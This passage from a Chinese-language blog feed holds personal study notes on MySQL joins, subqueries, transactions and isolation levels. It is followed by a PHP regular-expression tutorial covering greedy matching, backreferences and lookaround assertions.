class="hljs-keyword">join</span> dept d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br></code></pre></td></tr></table></figure><h3 id="连接查询-自连接"><a href="#连接查询-自连接" class="headerlink" title="连接查询-自连接"></a>连接查询-自连接</h3><p>自连接查询语法：</p><p>自连接查询，可以是内连接查询，也可以是外连接查询。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">A</span> 别名<span class="hljs-selector-tag">A</span> JOIN 表<span class="hljs-selector-tag">A</span> 别名<span class="hljs-selector-tag">B</span> ON 条件 ...;<br></code></pre></td></tr></table></figure><p>注意：在自连接查询时必须取别名 </p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询员工及其所属领导的名字</span><br><span class="hljs-keyword">select</span> a.name, b.name <span class="hljs-keyword">from</span> employee a, employee b <span class="hljs-keyword">where</span> a.manager = b.id;<br><span class="hljs-comment">-- 没有领导的也查询出来</span><br><span class="hljs-keyword">select</span> a.name, b.name <span class="hljs-keyword">from</span> employee a <span class="hljs-keyword">left join</span> employee b <span class="hljs-keyword">on</span> a.manager = b.id;<br></code></pre></td></tr></table></figure><h3 id="联合查询-union-union-all"><a href="#联合查询-union-union-all" class="headerlink" title="联合查询-union,union all"></a>联合查询-union,union all</h3><p>对于union查询，就是把多次查询的结果合并起来，形成一个新的查询结果集。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">A</span> ...<br>UNION <span class="hljs-selector-attr">[ALL]</span><br><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">B</span> ...;<br></code></pre></td></tr></table></figure><p><strong>注意事项</strong></p><ul><li>union all 会将全部的数据直接合并在一起，union 会对合并之后的数据去重</li><li><strong>对于联合查询的多张表的列数必须保持一致，字段类型也需要保持一致</strong></li></ul><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>概念：SQL语句中嵌套SELECT语句，称谓<strong>嵌套查询</strong>，又称<strong>子查询</strong>。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> t1 <span class="hljs-keyword">WHERE</span> column1 = (<span class="hljs-keyword">SELECT</span> column1 <span class="hljs-keyword">FROM</span> t2);<br></code></pre></td></tr></table></figure><p>子查询外部的语句可以是INSERT&#x2F;UPDATE&#x2F;DELETE&#x2F;SELECT的任何一个。</p><p>根据子查询结果不同，分为：</p><ul><li>标量子查询（子查询结果为单个值）</li><li>列子查询（子查询结果为一列）</li><li>行子查询（子查询结果为一行）</li><li>表子查询（子查询结果为多行多列）</li></ul><p>根据子查询位置，分为：WHERE之后、FROM之后、SELECT之后。</p><h4 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h4><p>子查询返回的结果是单个值（数字、字符串、日期等），最简单的形式，这种子查询成为标量子查询。</p><p>常用的操作符：&#x3D;  &lt;&gt;  &gt;  &gt;&#x3D;  &lt;  &lt;&#x3D;</p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询销售部所有员工</span><br><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span>;<br><span class="hljs-comment">-- 根据销售部部门ID，查询员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = <span class="hljs-number">4</span>;<br><span class="hljs-comment">-- 合并（子查询）</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span>);<br><br><span class="hljs-comment">-- 查询xxx入职之后的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> entrydate &gt; (<span class="hljs-keyword">select</span> entrydate <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h4><p>子查询返回的结果是一列（可以是多行），这种子查询称为列子查询。</p><p><img src="/../image/%E5%88%97%E5%AD%90%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%AC%A6.png"></p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询销售部和市场部的所有员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;市场部&#x27;</span>);<br><br><span class="hljs-comment">-- 查询比财务部所有人工资都高的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> salary &gt; <span class="hljs-keyword">all</span>(<span class="hljs-keyword">select</span> salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;财务部&#x27;</span>));<br><br><span class="hljs-comment">-- 查询比研发部任意一人工资高的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> salary &gt; <span class="hljs-keyword">any</span> (<span class="hljs-keyword">select</span> salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;研发部&#x27;</span>));<br></code></pre></td></tr></table></figure><h4 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h4><p>子查询返回的结果是一行（可以是多列），这种子查询称为行子查询。</p><p>常用的操作符：&#x3D;、&lt;&gt;、IN、NOT、IN</p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询与xxx的薪资及直属领导相同的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (salary, manager) = (<span class="hljs-number">12500</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (salary, manager) = (<span class="hljs-keyword">select</span> salary, manager <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="表子查询"><a href="#表子查询" class="headerlink" title="表子查询"></a>表子查询</h4><p>子查询返回的结果是多行多列，这种子查询称为表子查询。</p><p>常用的操作符：IN</p><p>例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- 查询与xxx1，xxx2的职位和薪资相同的员工<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (job, salary) <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> job, salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name = <span class="hljs-string">&#x27;xxx1&#x27;</span> <span class="hljs-keyword">or</span> name = <span class="hljs-string">&#x27;xxx2&#x27;</span>);<br>-- 查询入职日期是2006-01-01之后的员工，及其部门信息<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">e</span>.*, d.* <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> entrydate &gt; <span class="hljs-string">&#x27;2006-01-01&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">e</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br></code></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。</p><p>基本操作：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 1. 查询张三账户余额</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-comment">-- 2. 将张三账户余额-1000</span><br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-comment">-- 此语句出错后张三钱减少但是李四钱没有增加</span><br>模拟<span class="hljs-keyword">sql</span>语句错误<br><span class="hljs-comment">-- 3. 将李四账户余额+1000</span><br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><br><span class="hljs-comment">-- 查看事务提交方式</span><br><span class="hljs-keyword">SELECT</span> @@AUTOCOMMIT;<br><span class="hljs-comment">-- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效</span><br><span class="hljs-keyword">SET</span> @@AUTOCOMMIT = <span class="hljs-number">0</span>;<br><span class="hljs-comment">-- 提交事务</span><br><span class="hljs-keyword">COMMIT</span>;<br><span class="hljs-comment">-- 回滚事务</span><br><span class="hljs-keyword">ROLLBACK</span>;<br><br><span class="hljs-comment">-- 设置手动提交后上面代码改为：</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><p>操作方式二：</p><p>开启事务：<br><code>START TRANSACTION 或 BEGIN TRANSACTION;</code><br>提交事务：<br><code>COMMIT;</code><br>回滚事务：<br><code>ROLLBACK;</code></p><p>操作实例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">start</span> <span class="hljs-keyword">transaction</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><h3 id="四大特性ACID"><a href="#四大特性ACID" class="headerlink" title="四大特性ACID"></a>四大特性ACID</h3><ul><li>原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败</li><li>一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态</li><li>隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行</li><li>持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的</li></ul><h3 id="并发事务"><a href="#并发事务" class="headerlink" title="并发事务"></a>并发事务</h3><table><thead><tr><th>问题</th><th>描述</th></tr></thead><tbody><tr><td>脏读</td><td>一个事务读到另一个事务还没提交的数据</td></tr><tr><td>不可重复读</td><td>一个事务先后读取同一条记录，但两次读取的数据不同</td></tr><tr><td>幻读</td><td>一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在</td></tr></tbody></table><blockquote><p>这三个问题的详细演示：<a href="https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd">https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd</a></p></blockquote><p>并发事务隔离级别：</p><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>Read uncommitted</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Read committed</td><td>×</td><td>√</td><td>√</td></tr><tr><td>Repeatable Read(默认)</td><td>×</td><td>×</td><td>√</td></tr><tr><td>Serializable</td><td>×</td><td>×</td><td>×</td></tr></tbody></table><ul><li>√表示在当前隔离级别下该问题会出现</li><li>Serializable 性能最低；Read uncommitted 性能最高，数据安全性最差</li></ul><p>查看事务隔离级别：<br><code>SELECT @@TRANSACTION_ISOLATION;</code><br>设置事务隔离级别：<br><code>SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;;</code><br>SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式笔记</title>
      <link href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式简介"><a href="#正则表达式简介" class="headerlink" title="正则表达式简介"></a>正则表达式简介</h1><p><strong>正则表达式</strong>（Regular Expression，简称regex或regexp）是一种用于描述和匹配字符串模式的工具，广泛应用于文本处理中，包括搜索、替换和验证字符串。</p><h3 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a>主要用途</h3><p>正则表达式的主要用途包括：</p><ol><li>‌<strong>文本搜索</strong>‌：在大文本中查找特定的子字符串。</li><li>‌<strong>文本替换</strong>‌：将匹配的子字符串替换为其他字符串。</li><li>‌<strong>字符串验证</strong>‌：验证输入是否符合特定格式（如邮箱地址、电话号码、邮政编码等）。</li><li>‌<strong>数据提取</strong>‌：从文本中提取符合特定模式的数据‌</li></ol><h1 id="正则表达式的学习"><a href="#正则表达式的学习" class="headerlink" title="正则表达式的学习"></a>正则表达式的学习</h1><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外</p><p>常用的修饰符：</p><p><img src="/../image/%E4%BF%AE%E9%A5%B0%E7%AC%A6.png"></p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><h3 id="常用的字符簇"><a href="#常用的字符簇" class="headerlink" title="常用的字符簇"></a>常用的字符簇</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br>匹配范围<br>具体字符<span class="hljs-function"><span class="hljs-params">(字面值)</span>--&gt;</span> 比如说找a,b,hi<br>字符边界<span class="hljs-function"><span class="hljs-params">(下面加粗)</span>--&gt;</span> 从哪开始到哪结束<br>字符集合[ace],[<span class="hljs-number">0123456789</span>]--&gt; 里面任意条件符合的找出来<br>字符补集[^qxz]--&gt; 里面任意条件符合的不要<br>字符范围[a-z0-<span class="hljs-number">9</span>]--&gt; 注意:必须是连续的，不能写a-Z<br>字符簇(系统定义好的常用集合)<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E7%B0%87.png"></p><h3 id="字符边界"><a href="#字符边界" class="headerlink" title="字符边界"></a>字符边界</h3><p><img src="/../image/%E5%AD%97%E7%AC%A6%E8%BE%B9%E7%95%8C.png"></p><p>比如^a会去匹配行首的a</p><p>a$会去匹配行尾的a</p><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>用来限定匹配几个</p><p><img src="/../image/%E6%89%BE%E5%87%A0%E4%B8%AA.png"></p><h3 id="匹配多个字符"><a href="#匹配多个字符" class="headerlink" title="匹配多个字符"></a>匹配多个字符</h3><p>()</p><p>例如(ab)+,表示匹配ab出现1次或者多次</p><h3 id="或运算符"><a href="#或运算符" class="headerlink" title="或运算符"></a>或运算符</h3><p>|</p><p>比如：(cat|dog)b，表示匹配catb或者dogb</p><p>如果是：cat|dogb，表示匹配cat或者dogb</p><h3 id="集合和补集"><a href="#集合和补集" class="headerlink" title="集合和补集"></a>集合和补集</h3><p>集合：[]</p><p>比如[abcd]表示能匹配的字符是a,b,c,d</p><p>补集[^abcd]表示能匹配的字符是除了a,b,c,d的其他所有字符</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/../image/%E6%9C%80%E7%BB%88%E6%80%BB%E7%BB%93.png"></p><h2 id="PHP中关于正则表达式的函数"><a href="#PHP中关于正则表达式的函数" class="headerlink" title="PHP中关于正则表达式的函数"></a>PHP中关于正则表达式的函数</h2><p>preg_match_all()通过一个正则表达式匹配字符串</p><p>例如：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><br>$str = &#x27;hello o2o <span class="hljs-number">2b9</span> <span class="hljs-number">250</span>&#x27;;<br>$patt = &#x27;/\b[a-zA-Z]+\b|\b[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+\b/&#x27;; // 或者的用法<br>preg_match_all($patt,$str,$res);<br></code></pre></td></tr></table></figure><p>preg_replace()执行一个正则表达式的搜索和替换</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//把所有空格替换成一个空格</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;tommorw         is           another         day&quot;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&quot;/\s&#123;1,&#125;/&quot;</span>; 表示至少匹配一个空格<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$patt</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>preg_split()通过一个正则表达式分割字符串</p><p>例如：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><br>$str = <span class="hljs-string">&#x27;tommorw is another day,o2o ,you dont bird me idont bird you&#x27;</span><span class="hljs-comment">;</span><br>$patt = <span class="hljs-string">&#x27;/\W&#123;1,&#125;/&#x27;</span><span class="hljs-comment">;</span><br>print_r(preg_split($patt,$str))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h2><p>贪婪模式：表示尽量往后匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 贪婪模式 尽量往后匹配</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;ksda good goooood good kl s ja dfs dk &#x27;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/g.+d/&#x27;</span>; <span class="hljs-comment">// god  .点  任意字符，不含换行</span><br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$patt</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-built_in">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span><br>        (<br>            [<span class="hljs-number">0</span>] =&gt; good goooood good kl s ja dfs d<br>        )<br><br>)<br></code></pre></td></tr></table></figure><hr><p>非贪婪模式：在数量限定词后面加?</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;ksda good goooood good kl s ja dfs dk &#x27;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/g.+?d/&#x27;</span>; <span class="hljs-regexp">//</span> god  .点  任意字符，不含换行<br>preg_match_all(<span class="hljs-variable">$patt</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br>print_r(<span class="hljs-variable">$res</span>);<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-built_in">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span><br>        (<br>            [<span class="hljs-number">0</span>] =&gt; good<br>            [<span class="hljs-number">1</span>] =&gt; goooood<br>            [<span class="hljs-number">2</span>] =&gt; good<br>        )<br><br>)<br></code></pre></td></tr></table></figure><p>区别：可以发现贪婪模式会尽量往后匹配整段字符串，而非贪婪模式会匹配单段满足条件的字符串</p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>在后面表达式中引用前面括号内的结果，第一个括号为\1 第二个为\2</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;txt hello,high,bom,mum,afewaa,bafsdab,ceagiac&quot;</span>;<br><span class="hljs-comment">// $patt = &#x27;/\bt\w+t\b/&#x27;;</span><br><br><span class="hljs-comment">// 后向引用</span><br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/\b([a-z])\w+\1\b/&#x27;</span>;  <span class="hljs-comment">// 引用前面括号里的结果 第一个括号为\1 第二个为\2</span><br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$patt</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>后行断言和先行断言有时候被称为断言，它们是特殊类型的 <strong>非捕获组</strong>（用于匹配模式，但不包括在匹配列表中）。当我们在一种特定模式之前或者之后有这种模式时，会优先使用断言。 例如我们想获取输入字符串 $4.44 and $10.88 中带有前缀 $ 的所有数字。我们可以使用这个正则表达式 (?&lt;&#x3D;$)[0-9.]*，表示：获取包含 . 字符且前缀为 $ 的所有数字。 以下是正则表达式中使用的断言：</p><table><thead><tr><th><em><strong>*符号*</strong></em></th><th><em><strong>*描述*</strong></em></th></tr></thead><tbody><tr><td>?&#x3D;</td><td>正向先行断言</td></tr><tr><td>?!</td><td>负向先行断言</td></tr><tr><td>?&lt;&#x3D;</td><td>正向后行断言</td></tr><tr><td>?&lt;!</td><td>负向后行断言</td></tr></tbody></table><h3 id="正向先行断言"><a href="#正向先行断言" class="headerlink" title="正向先行断言"></a>正向先行断言</h3><p>正向先行断言认为第一部分的表达式的后面必须是先行断言表达式。返回的匹配结果仅包含与第一部分表达式匹配的文本。 要在一个括号内定义一个正向先行断言，在括号中问号和等号是这样使用的 (?&#x3D;…)。先行断言表达式写在括号中的等号后面。 例如正则表达式 (T|t)he(?&#x3D;\sfat)，表示：匹配大写字母 T 或小写字母 t，后面跟字母 h，后跟字母 e。 在括号中，我们定义了正向先行断言，它会引导正则表达式引擎匹配后面跟着 fat 的 The 或 the。</p><p>“(T|t)he(?&#x3D;\sfat)” &#x3D;&gt; <a href="#learn-regex">The</a> fat cat sat on the mat.</p><h3 id="负向先行断言"><a href="#负向先行断言" class="headerlink" title="负向先行断言"></a>负向先行断言</h3><p>当我们需要指定第一部分表达式的后面不跟随某一内容时，使用负向先行断言。负向先行断言的定义跟我们定义的正向先行断言一样， 唯一的区别在于我们使用否定符号 ! 而不是等号 &#x3D;，例如 (?!…)。 我们来看看下面的正则表达式 (T|t)he(?!\sfat)，表示：从输入字符串中获取全部 The 或者 the 且不匹配 fat 前面加上一个空格字符。</p><p>“(T|t)he(?!\sfat)” &#x3D;&gt; The fat cat sat on <a href="#learn-regex">the</a> mat.</p><h3 id="正向后行断言"><a 